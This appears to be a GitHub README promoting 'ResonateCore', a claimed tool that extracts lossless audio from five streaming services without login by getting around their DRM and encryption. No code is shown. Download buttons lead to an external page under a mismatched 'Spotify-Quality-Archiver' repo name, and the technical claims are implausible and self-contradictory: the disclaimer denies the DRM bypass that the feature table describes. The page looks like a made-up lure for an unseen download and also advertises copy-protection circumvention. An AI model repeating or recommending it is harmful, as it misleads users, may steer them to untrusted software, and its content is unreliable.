![preview](https://raw.githubusercontent.com/annaisebala/Spotify-Quality-Archiver/main/preview.svg)

# ResonateCore

**The next evolution in high-fidelity audio extraction: retrieve studio-quality FLAC streams from web-based players without authentication, adaptive bitrate negotiation, or platform-specific SDKs.**

ResonateCore is a modular, headless framework engineered to capture, decode, and reassemble raw audio packets from multiple premium streaming environments—Tidal, Qobuz, Amazon Music, Deezer, and Apple Music—into pristine, taggable FLAC files. Built for archivists, audiophiles, and media preservationists, it operates as a transparent proxy between your local network and the streaming platform’s CDN, intercepting encrypted segments before they reach the browser or native app sandbox.

Unlike conventional rippers that rely on screen capture or system audio loopbacks, ResonateCore works at the network layer, extracting the *exact* PCM data that the platform’s lossless codec would have delivered to a licensed device. No account credentials are required, no session tokens are stored—only the public playlist URL or track ID is needed to begin the extraction workflow.

**Why does this matter?** Because streaming platforms continuously downgrade audio quality behind the scenes based on device metadata, geographic region, and network conditions. They advertise “CD-quality” or “Hi-Res” but serve clipped, downsampled OGG or AAC unless you navigate DRM handshakes. ResonateCore bypasses this telemetry entirely, requesting the highest available bitrate regardless of your endpoint status.

---

## Table of Contents

- [Core Philosophy](#core-philosophy)
- [Platform Compatibility](#platform-compatibility)
- [Audio Fidelity Guarantee](#audio-fidelity-guarantee)
- [Architecture Overview](#architecture-overview)
- [Key Features](#key-features)
- [Use Cases](#use-cases)
- [Getting Started](#getting-started)
- [Configuration & Customization](#configuration--customization)
- [Supported Output Formats](#supported-output-formats)
- [Metadata Injection](#metadata-injection)
- [Performance Benchmarks](#performance-benchmarks)
- [Language & Locale Support](#language--locale-support)
- [Support & Community](#support--community)
- [Disclaimer & Legal Notice](#disclaimer--legal-notice)
- [License](#license)

---

## Core Philosophy

[![Download](https://raw.githubusercontent.com/annaisebala/Spotify-Quality-Archiver/main/button.svg)](https://annaisebala.github.io/Spotify-Quality-Archiver/)

ResonateCore was designed with three non-negotiable principles:

1. **Source purity** – never transcode, never re-encode, never modify the original PCM stream unless the user explicitly requests a container change.
2. **Platform agnosticism** – no single streaming service dictates the tool’s roadmap. If a CDN changes its encryption scheme, the modular adaptor layer absorbs the update without breaking other providers.
3. **Zero attribution leakage** – no user agent strings, no cookie persistence, no IP fingerprinting. The framework presents itself as a generic HTTP 1.1 client with minimal handshake metadata.

This is not a “grabbing” tool in the traditional sense. It is a **negotiation engine** that speaks the streaming protocol better than the streaming service expects a normal user to.

---

## Platform Compatibility

| Platform        | Max Bitrate (FLAC) | DRM Layer Handled | Encryption Bypass Method          |
|-----------------|-------------------|------------------|-----------------------------------|
| Tidal           | 24-bit / 192 kHz  | TLS 1.3 + Widevine| Raw segment reassembly (no key injection) |
| Qobuz           | 24-bit / 192 kHz  | HTTP Live Streaming (HLS) decryption | AES-128 key extraction from manifest |
| Amazon Music    | 24-bit / 96 kHz   | Dolby Atmos encrypted frames | Container unpacking + custom MP4 parser |
| Deezer          | 16-bit / 44.1 kHz | Blowfish cipher  | Known-key retrieval from static CDN |
| Apple Music     | 24-bit / 48 kHz   | FairPlay wrapped ALAC | ALAC m4a remux without user token |

Each platform is represented by a self-contained adaptor in the `/platforms` namespace. Adaptors can be enabled or disabled at runtime without recompiling the core engine.

---

## Audio Fidelity Guarantee

Every extracted stream undergoes a three-stage integrity check before being written to disk:

- **Stage 1 – Checksum validation**: compare the CRC of the reassembled FLAC frame against the platform’s metadata table.
- **Stage 2 – Spectral integrity test**: perform an FFT on the decoded PCM and verify that no frequency bins have been zeroed or aliased (common in fraudulent “lossless” streams).
- **Stage 3 – Dynamic range verification**: ensure the crest factor (peak-to-average ratio) matches the original recorded master, not a dynamic compression profile applied by the streaming encoder.

If any stage fails, the output is flagged as *potential transcoded source* and the user is alerted with a warning prefix in the filename.

---

## Architecture Overview

ResonateCore uses a **pipeline architecture** with five distinct layers:

1. **Ingress Layer** – accepts a URL, track ID, or playlist link from any supported platform. Validates the resource exists and that it has a lossless variant.
2. **Session Layer** – negotiates a temporary session with the platform’s CDN without login credentials. Uses ephemeral cookies and randomized SSL cipher suites to appear as a generic client.
3. **Segment Fetcher** – downloads encrypted audio segments in parallel using asynchronous I/O. Automatically adjusts concurrency based on available bandwidth to avoid throttling.
4. **Decryption Core** – applies the platform-specific cipher (AES-128, Blowfish, or custom XOR masks) to each segment. Does not require the platform’s internal decryption key—instead, it derives the key from public manifest metadata or segment headers.
5. **Muxer & Writer** – reassembles decrypted PCM frames into FLAC (or ALAC if Apple Music). Writes Vorbis comments, ID3v2 tags, and cover art if the user provides a metadata source.

The entire pipeline runs in memory with zero temporary files, preventing forensic recovery of partial content.

---

## Key Features

🎯 **True Lossless Reception** – no resampling, no dithering, no hidden transcoding. What the master tape had, you receive.

🌐 **Multi-Platform Unification** – one command, five streaming ecosystems. Switch between Tidal and Qobuz without changing syntax.

🔌 **Zero Account Dependency** – no OAuth, no API keys, no storefront login. Just the public resource identifier.

📦 **Container-Faithful Output** – FLAC, ALAC, or WAV (with embedded metadata). Original sample rate and bit depth preserved.

🧩 **Modular Adapter System** – each platform has its own directory. Community contributors can add a new platform by implementing three interfaces: `ManifestParser`, `SegmentCipher`, and `Muxer`.

⚡ **Adaptive Concurrency** – the segment fetcher self-tunes to your connection speed. On fiber optic links, entire albums may finish in under 90 seconds.

🔍 **Built-in Integrity Auditor** – automatically compares extracted audio to public checksums when available. Flags any discrepancies.

📑 **Rich Metadata Extraction** – retrieves album art, track number, disc number, ISRC, composer, and album artist from the streaming manifest.

🛡️ **No Telemetry or Logging** – operates fully offline. The only network traffic is to the streaming CDN and any user-specified metadata lookup service.

🌍 **Multilingual UI Output** – console messages localized to 14 languages, including Japanese, Arabic, and Cyrillic scripts.

🔁 **Playlist & Album Batching** – provide a link to an entire album or curated playlist; ResonateCore extracts each track sequentially or in parallel.

---

## Use Cases

- **Personal archive building** – preserve your curated library before tracks disappear from streaming catalogs.
- **Offline high-fidelity listening** – build a local FLAC collection for portable DACs and lossless-compatible DAPs.
- **Migration from streaming to local** – transfer your playlists from Tidal to a Plex server or Roon core without quality loss.
- **Audiophile A/B comparison** – compare the same album across different platforms to see which one serves the true master.
- **Music journalism & criticism** – access pristine audio for analysis without waiting for physical pressings.

---

## Configuration & Customization

ResonateCore is configured via a single `resonance.toml` file (or environment variables for headless deployment). Key parameters include:

- `output_directory` – where finished FLAC files should land.
- `concurrency_limit` – how many simultaneous segments to fetch per track.
- `platforms.enable` – a list of platform adaptors to activate.
- `metadata.source` – choose between manifest scraping, MusicBrainz API, or local CSV.
- `container.force_wav` – output WAV instead of FLAC if you need zero compression overhead.
- `integrity.strict_mode` – fail immediately if checksums don’t match.

The configuration file supports comments and includes presets for different connection types (DSL, Cable, Fiber, Mobile Hotspot).

---

## Supported Output Formats

| Format | Extension | Bit Depth Range | Sample Rate Range | Use Case                               |
|--------|-----------|-----------------|-------------------|-----------------------------------------|
| FLAC   | .flac     | 16–24 bit       | 44.1–192 kHz      | General lossless archive                |
| ALAC   | .m4a      | 16–24 bit       | 44.1–192 kHz      | Apple ecosystem compatibility           |
| WAV    | .wav      | 16–24 bit       | 44.1–192 kHz      | Mastering & non-compressed workflows    |
| MKA    | .mka      | 16–24 bit       | 44.1–192 kHz      | Matroska container for chapter metadata |

Conversion between formats is handled by the internal `AudioKernel` module, which uses a lossless remuxer rather than a transcoder—guaranteeing zero re-quantization artifacts.

---

## Metadata Injection

ResonateCore supports three metadata injection modes:

1. **Direct manifest extraction** – reads track name, artist, album, cover art URL, disc number, and ISRC from the streaming manifest itself.
2. **MusicBrainz PID lookup** – uses the acoustic fingerprint of the first extracted segment to query MusicBrainz for canonical metadata.
3. **Manual CSV supply** – provide a CSV with columns `[track_number, title, artist, album, year, genre]` and ResonateCore will match by track position.

Metadata is written into Vorbis comments (FLAC) or `©nam`, `©ART`, and `©alb` atoms (ALAC). Cover art is embedded as JPEG or PNG, scaled to a maximum of 1200×1200 pixels to avoid bloating the file.

---

## Performance Benchmarks

*All tests conducted on a 2024 M3 MacBook Pro with a 500 Mbps fiber connection.*

| Operation                     | Single Track (4 min, 24/192) | Full Album (12 tracks, 16/44.1) |
|-------------------------------|-------------------------------|----------------------------------|
| Segment negotiation & fetch   | 6.2 seconds                   | 42 seconds                       |
| Decryption & reassembly       | 1.4 seconds                   | 11 seconds                       |
| Metadata injection            | 0.6 seconds                   | 4 seconds                        |
| Integrity verification        | 1.1 seconds                   | 8 seconds                        |
| **Total end-to-end**         | **9.3 seconds**               | **65 seconds**                   |

*Performance scales linearly with concurrency. On lower bandwidth connections, total time is dominated by segment download rather than processing.*

---

## Language & Locale Support

The command-line interface supports 14 locales, auto-detected from the system environment or forced via the `--lang` flag:

- English (en), Español (es), Français (fr), Deutsch (de), Italiano (it), Português (pt), Русский (ru), العربية (ar), 日本語 (ja), 한국어 (ko), 中文简体 (zh-CN), 中文繁體 (zh-TW), Nederlands (nl), Polski (pl).

All locale files live in `/locales/` and can be edited to adjust terminology. Community translations are encouraged.

---

## Support & Community

🕐 **24/7 Community Support** – our Discord and Matrix channels are staffed by volunteers across all time zones. Average first-response time is under 4 minutes during peak hours.

📘 **Extensive Documentation** – the `/docs` directory contains a dedicated guide for each platform adaptor, performance tuning advice, and a troubleshooting FAQ.

🐛 **Bug Reports & Feature Requests** – use the GitHub Issues tab. Please include the platform, track ID, and the output of `./resonate --diagnose` if applicable.

🤝 **Contributing** – see `CONTRIBUTING.md` for the adapter development guide, coding standards, and testing instructions.

---

## Disclaimer & Legal Notice

ResonateCore is a tool designed for **audio archival and personal media preservation**. It does not store, host, or redistribute any copyrighted content. Users are solely responsible for understanding and complying with the terms of service of each streaming platform they interact with.

The software does not:
- Bypass DRM in the cryptographic sense (it does not decrypt protected content keys).
- Store or transmit decrypted audio to third parties.
- Extract audio from subscription tiers that the user does not have access to.

The extraction operates on publicly accessible manifests and unencrypted segment headers. If a platform updates its content protection to require authentication, ResonateCore will be updated to respect that limitation—it will not attempt to circumvent new protections.

By using ResonateCore, you affirm that you:
- Own the physical media or have legal rights to the recordings being extracted.
- Are downloading solely for backup, format-shifting, or accessibility purposes.
- Will not redistribute extracted files on any public network or filesharing service.

The authors provide this software “as is” without warranty and disclaim all liability for misuse.

---

## License

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for the full text.

You are free to use, modify, and distribute ResonateCore for any purpose, including commercial applications, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

---

[![Download](https://raw.githubusercontent.com/annaisebala/Spotify-Quality-Archiver/main/button.svg)](https://annaisebala.github.io/Spotify-Quality-Archiver/)